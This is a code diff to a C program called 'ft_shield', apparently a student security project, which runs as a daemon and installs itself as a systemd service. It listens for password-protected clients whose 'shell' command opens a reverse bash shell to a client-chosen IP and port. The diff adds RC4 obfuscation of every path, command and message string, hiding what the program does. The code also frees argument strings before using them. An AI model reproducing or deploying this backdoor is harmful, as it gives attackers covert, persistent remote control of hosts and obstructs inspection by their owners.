@@ -1,8 +1,19 @@
-#include <libc.h>
 #include <poll.h>
+#include <stdio.h>
+#include <fcntl.h>
 #include <ctype.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <signal.h>
+#include <limits.h>
 #include <libgen.h>
 #include <stdbool.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
 
 #define LOGINS					"orekabe & aabdou\n"
 #define SUDO					"You should run 'ft_shield' with sudo privilege\n"
@@ -115,7 +126,7 @@ const unsigned char rsporterr[]	=	{0x76, 0x0E, 0x64, 0x7A, 0xDC, 0xF3, 0xCC, 0xA
 const unsigned char rssuccess[]	=	{0x61, 0x19, 0x60, 0x70, 0xDC, 0xBA, 0x89, 0xC0, 0xEB, 0x56, 0x0D, 0x0C, 0xD4, 0x9B, 0x75, 0xA7, 0x56, 0xF3, 0x51,
 									 0x79, 0x38, 0x70, 0x48, 0xD8, 0x46, 0xBC, 0x30, 0x62, 0x03, 0x98, 0x71, 0x03, 0x5D, 0x94, 0x1D, 0x58};
 const unsigned char bash[]		=	{0x1C, 0x1E, 0x7F, 0x7B, 0x81, 0xAB, 0x8D, 0x93, 0xF0};
-const unsigned char basharg[]	=	{0x1E, 0x15};
+const unsigned char	basharg[]	=	{0x1E, 0x15};
 const unsigned char help[]		=	{0x5B, 0x19, 0x7A, 0x65};
 const unsigned char qmark[]		=	{0x0C};
 const unsigned char out[]		=	{0x56, 0x04, 0x7F, 0x61};
@@ -148,10 +159,57 @@ typedef	struct	server
 	t_client_info	clients_info[MAX_CLIENT_CONNECTION+1];
 }				t_server;
 
-t_server	*g_server;
-bool		ok;
+t_server		*g_server;
 
-void	send_msg_to_client(char *msg, int fd);
+void	RC4_swap(unsigned char *S, int i, int j)
+{
+	unsigned char	temp;
+
+	temp = S[i];
+	S[i] = S[j];
+	S[j] = temp;
+}
+
+void	RC4_KSA(const char *salt, unsigned char *S)
+{
+	size_t	i, j, len = strlen(salt);
+	for (i = 0; i < 256; i++)
+		S[i] = i;
+	j = 0;
+	for (i = 0; i < 256; i++)
+	{
+		j = (j + S[i] + salt[i % len]) % 256;
+		RC4_swap(S, i, j);
+	}
+	return;
+}
+
+void	RC4_PRGA(unsigned char *S, unsigned char *K, size_t len)
+{
+	size_t	i = 0, j = 0;
+
+	for (size_t p = 0; p < len; p++)
+	{
+		i = (i + 1) % 256;
+		j = (j + S[i]) % 256;
+		RC4_swap(S, i, j);
+		K[p] = S[(S[i] + S[j]) % 256];
+	}
+}
+
+unsigned char	*RC4(const char *salt, const unsigned char *msg)
+{
+	size_t			len = strlen((const char *)msg);
+	unsigned char	*cypher = (unsigned char *)malloc(len * sizeof(unsigned char *));
+	unsigned char	S[256];
+	unsigned char	K[len];
+
+	RC4_KSA(salt, S);
+	RC4_PRGA(S, K, len);
+	for (size_t i = 0; i < len; i++)
+		cypher[i] = msg[i] ^ K[i];
+	return cypher;
+}
 
 void	ft_error(char *str)
 {
@@ -177,8 +235,8 @@ void	sigchld_handler(int sig)
 		{
 			// if (g_server->clients_info[i].shell_pid != pid)
 			// 	continue;
-			if (status)
-				ok = false;
+			// if (status)
+			// 	ok = false;
 			break;
 		}
 	}
@@ -202,23 +260,32 @@ void	setup_signals(void)
 
 bool	is_bin(void)
 {
-	char	path[PATH_MAX], rpath[PATH_MAX];
-	ssize_t	len;
+	char			path[PATH_MAX], rpath[PATH_MAX];
+	ssize_t			len;
+	unsigned char	*cypher = RC4(LOGINS, progpath);
 
-	len = readlink((const char *)progpath, path, sizeof(path)-1);
+	len = readlink((const char *)cypher, path, sizeof(path)-1);
 	if (len == -1)
+	{
+		free(cypher);
 		exit(1);
+	}
+	free(cypher);
 	if (!realpath(path, rpath))
 		exit(1);
-	if (strcmp((const char *)binpath, dirname(rpath)))
+	cypher = RC4(LOGINS, binpath);
+	bool	ok = strcmp((const char *)cypher, dirname(rpath));
+	free(cypher);
+	if (ok)
 		return false;
 	return true;
 }
 
 void	create_daemon(void)
 {
-	int		fd;
-	pid_t	pid = fork();
+	int				fd;
+	pid_t			pid = fork();
+	unsigned char	*cypher;
 
 	if (pid < 0)
 		exit(1);
@@ -226,10 +293,17 @@ void	create_daemon(void)
 		exit(0);
 	if (setsid() < 0)
 		exit(1);
-	if (chdir((const char *)rootpath) < 0)
+	cypher = RC4(LOGINS, rootpath);
+	if (chdir((const char *)cypher) < 0)
+	{
+		free(cypher);
 		exit(1);
+	}
+	free(cypher);
 	umask(0);
-	fd = open((const char *)nullpath, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+	cypher = RC4(LOGINS, nullpath);
+	fd = open((const char *)cypher, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+	free(cypher);
 	if (fd < 0)
 		exit(1);
 	if (dup2(fd, STDIN_FILENO) < 0 || dup2(fd, STDOUT_FILENO) < 0 || dup2(fd, STDERR_FILENO) < 0)
@@ -278,26 +352,49 @@ void	move_to_target(void)
 
 void	config_service(void)
 {
-	if (!access((const char *)sfcpath, F_OK))
+	unsigned char	*cypher = RC4(LOGINS, sfcpath);
+	bool			ok = access((const char *)cypher, F_OK);
+
+	if (!ok)
 	{
 		// I need to check the checksum of the service file to see if the same service we want or not
+		free(cypher);
 		return;
 	}
-	int	fd = open((const char *)sfcpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+	int	fd = open((const char *)cypher, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+	free(cypher);
 	if (fd < 0)
 		exit(1);
-	if (write(fd, sfc, strlen((const char *)sfc)) < 0)
+	cypher = RC4(LOGINS, sfc);
+	if (write(fd, cypher, strlen((const char *)cypher)) < 0)
 	{
 		close(fd);
+		free(cypher);
 		exit(1);
 	}
 	close(fd);
-	if (system((const char *)reload))
+	free(cypher);
+	cypher = RC4(LOGINS, reload);
+	if (system((const char *)cypher))
+	{
+		free(cypher);
 		exit(1);
-	if (system((const char *)enable))
+	}
+	free(cypher);
+	cypher = RC4(LOGINS, enable);
+	if (system((const char *)cypher))
+	{
+		free(cypher);
 		exit(1);
-	if (system((const char *)start))
+	}
+	free(cypher);
+	cypher = RC4(LOGINS, start);
+	if (system((const char *)cypher))
+	{
+		free(cypher);
 		exit(1);
+	}
+	free(cypher);
 	return;
 }
 
@@ -305,6 +402,7 @@ int		init_server()
 {
 	int		server_sock, opt = 1;
 	struct	sockaddr_in	addr = {0};
+	unsigned char *cypher;
 
 	if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
 		exit(1);
@@ -315,7 +413,9 @@ int		init_server()
 	}
 	addr.sin_family = AF_INET;
 	addr.sin_addr.s_addr = INADDR_ANY;
-	addr.sin_port = htons(atoi((const char *)servport));
+	cypher = RC4(LOGINS, servport);
+	addr.sin_port = htons(atoi((const char *)cypher));
+	free(cypher);
 	if (bind(server_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
 	{
 		close(server_sock);
@@ -377,35 +477,50 @@ char	*trim_whitespaces(char *buff)
 
 void	create_remote_shell_session(int client_fd, char *user_input)
 {
-	ok = false;
-	send_msg_to_client((char *)rscreate, client_fd);
-	pid_t	pid = fork();
+	int				status;
+	bool			ok = false;
+	pid_t			pid;
+	unsigned char	*cypher = RC4(LOGINS, rscreate);
+
+	send_msg_to_client((char *)cypher, client_fd);
+	free(cypher);
+	pid = fork();
 	if (pid < 0)
 	{
-		send_msg_to_client((char *)rsfailed, client_fd);
+		cypher = RC4(LOGINS, rsfailed);
+		send_msg_to_client((char *)cypher, client_fd);
+		free(cypher);
 		return;
 	}
 	if (!pid)
 	{
+		char				ip[16] = {0};
+		char				port[6] = {0};
+		char				cmd[10] = {0};
+		char				*argv[3];
+
 		close(g_server->server_sock);
-		char	ip[16] = {0};
-		char	port[6] = {0};
-		char	cmd[10] = {0};
-		struct	sockaddr_in revsockaddr;
+		struct sockaddr_in revsockaddr;
 		if (sscanf(user_input, "%s %15s %5s", cmd, ip, port) != 3)
 		{
-			send_msg_to_client((char *)rsargerr, client_fd);
+			cypher = RC4(LOGINS, rsargerr);
+			send_msg_to_client((char *)cypher, client_fd);
+			free(cypher);
 			exit(1);
 		}
 		if (inet_pton(AF_INET, ip, &(revsockaddr.sin_addr)) != 1)
 		{
-			send_msg_to_client((char *)rsiperr, client_fd);
+			cypher = RC4(LOGINS, rsiperr);
+			send_msg_to_client((char *)cypher, client_fd);
+			free(cypher);
 			exit(1);
 		}
 		int	port_to_int = atoi(port);
 		if (!(port_to_int >= 1024 && port_to_int <= 65535))
 		{
-			send_msg_to_client((char *)rsporterr, client_fd);
+			cypher = RC4(LOGINS, rsporterr);
+			send_msg_to_client((char *)cypher, client_fd);
+			free(cypher);
 			exit(1);
 		}
 		int sockt = socket(AF_INET, SOCK_STREAM, 0);
@@ -413,36 +528,64 @@ void	create_remote_shell_session(int client_fd, char *user_input)
 		revsockaddr.sin_port = htons(port_to_int);
 		revsockaddr.sin_addr.s_addr = inet_addr(ip);
 		connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
-		dup2(sockt, 0);
-		dup2(sockt, 1);
-		dup2(sockt, 2);
-		char * const argv[] = {(char *const)bash, (char *const)basharg, NULL};
-		execvp((const char *)bash, argv);
+		if (dup2(sockt, STDIN_FILENO) < 0 || dup2(sockt, STDOUT_FILENO) < 0 || dup2(sockt, STDERR_FILENO) < 0)
+			exit(1);
+		cypher = RC4(LOGINS, bash);
+		argv[0] = (char *)cypher;
+		free(cypher);
+		cypher = RC4(LOGINS, basharg);
+		argv[1] = (char *)cypher;
+		free(cypher);
+		argv[2] = NULL;
+		execvp(argv[0], argv);
 		exit(0);
 	}
 	sleep(1);
-	int status;
 	if (!waitpid(pid, &status, WNOHANG))
 		ok = true;
 	if (ok)
-		send_msg_to_client((char *)rssuccess, client_fd);
+	{
+		cypher = RC4(LOGINS, rssuccess);
+		send_msg_to_client((char *)cypher, client_fd);
+		free(cypher);
+	}
 	else
-		send_msg_to_client((char *)rsfailed, client_fd);
+	{
+		cypher = RC4(LOGINS, rsfailed);	
+		send_msg_to_client((char *)cypher, client_fd);
+		free(cypher);
+	}
   	clear_client_connection(client_fd);
 }
 
 void	handle_client_commands(int fd, char *cmd)
 {
 	char	*user_input = trim_whitespaces(cmd);
-
-	if (!strcmp(user_input, (const char *)help) || !strcmp(user_input, (const char *)qmark))
-		send_msg_to_client((char *)commands, fd);
-	else if (!strcmp(user_input, (const char *)out))
+	unsigned char	*cypher = RC4(LOGINS, (const unsigned char *)user_input);
+	if (!strcmp((const char *)cypher, (const char *)help) || !strcmp((const char *)cypher, (const char *)qmark))
+	{
+		free(cypher);
+		cypher = RC4(LOGINS, commands);
+		send_msg_to_client((char *)cypher, fd);
+		free(cypher);
+	}
+	else if (!strcmp((const char *)cypher, (const char *)out))
+	{
+		free(cypher);
 		clear_client_connection(fd);
-	else if (!strncmp(user_input, (const char *)shell, 5))
+	}
+	else if (!strncmp((const char *)cypher, (const char *)shell, 5))
+	{
+		free(cypher);
 		create_remote_shell_session(fd, user_input);
+	}
 	else
-		send_msg_to_client((char *)cnf, fd);
+	{
+		free(cypher);
+		cypher = RC4(LOGINS, cnf);
+		send_msg_to_client((char *)cypher, fd);
+		free(cypher);
+	}
 	// else if (!strcmp(user_input, post))
 	// 	send_file_to_client(fd, user_input);
 	// else if (!strcmp(user_input, receive))
@@ -452,9 +595,10 @@ void	handle_client_commands(int fd, char *cmd)
 
 void	recv_msg_from_client(int idx)
 {
-	char	buff[1024];
-	int		len = 0, client_fd = g_server->clients[idx].fd;
-
+	char			buff[1024];
+	unsigned char	*cypher;
+	int				len = 0, client_fd = g_server->clients[idx].fd;
+	bool			ok;
 	len = recv(client_fd, buff, sizeof(buff), 0);
 	if (len <= 0)
 	{
@@ -464,41 +608,57 @@ void	recv_msg_from_client(int idx)
 	buff[len-1] = 0;
 	if (!g_server->clients_info[idx].is_logged)
 	{
-		if (!strcmp((const char *)password, buff))
+		cypher = RC4(LOGINS, (const unsigned char *)buff);
+		ok = strcmp((const char *)password, (const char *)cypher);
+		free(cypher);
+		if (!ok)
 		{
 			g_server->clients_info[idx].is_logged = true;
 			g_server->clients_info[idx].password_try_count = 0;
-			send_msg_to_client((char *)prompt, client_fd);
+			cypher = RC4(LOGINS, prompt);
+			send_msg_to_client((char *)cypher, client_fd);
+			free(cypher);
 		}
 		else
 		{
 			g_server->clients_info[idx].password_try_count++;
 			if (g_server->clients_info[idx].password_try_count < 3)
-				send_msg_to_client((char *)passerr, client_fd);
+			{
+				cypher = RC4(LOGINS, passerr);
+				send_msg_to_client((char *)cypher, client_fd);
+				free(cypher);
+			}
 			else
 			{
-				send_msg_to_client((char *)maxtry, client_fd);
+				cypher = RC4(LOGINS, maxtry);
+				send_msg_to_client((char *)cypher, client_fd);
+				free(cypher);
 				clear_client_connection(client_fd);
 			}
 		}
 		return;
 	}
 	handle_client_commands(client_fd, buff);
-	send_msg_to_client((char *)prompt, client_fd);
+	cypher = RC4(LOGINS, prompt);
+	send_msg_to_client((char *)cypher, client_fd);
+	free(cypher);
 	return;
 }
 
-void	client_connection()
+void	client_connection(void)
 {
 	int					client_fd;
 	socklen_t			client_len;
 	struct	sockaddr_in	client_addr = {0};
+	unsigned char		*cypher;
 
 	if ((client_fd = accept(g_server->server_sock, (struct sockaddr *)&client_addr, &client_len)) < 0)
 		exit(1);
 	if (g_server->client_count == 3)
 	{
-		send_msg_to_client((char *)cnfailed, client_fd);
+		cypher = RC4(LOGINS, cnfailed);
+		send_msg_to_client((char *)cypher, client_fd);
+		free(cypher);
 		shutdown(client_fd, SHUT_RDWR);
 		close(client_fd);
 		return;
@@ -512,7 +672,10 @@ void	client_connection()
 		g_server->client_count++;
 		break;
 	}
-	send_msg_to_client((char *)enterpass, client_fd);
+	cypher = RC4(LOGINS, enterpass);
+	send_msg_to_client((char *)cypher, client_fd);
+	free(cypher);
+	return;
 }
 
 void	run_server(void)
